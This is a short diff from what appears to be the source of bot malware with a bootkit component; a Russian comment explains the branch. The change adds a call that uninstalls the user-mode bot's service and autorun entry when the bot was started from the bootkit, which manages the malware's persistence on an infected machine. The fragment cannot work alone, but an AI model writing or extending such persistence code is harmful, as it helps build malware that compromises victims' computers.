@@ -73,6 +73,7 @@ DWORD WINAPI LoaderRoutine(LPVOID Data)
 	switch( BOT::GetBotType() )
 	{
 		case BotBootkit: //если стартовали из под буткита, то удаляем ring3 бота из автозагрузки
+			BOT::UninstallService();
 			BOT::DeleteAutorunBot();
 			break;
 	}
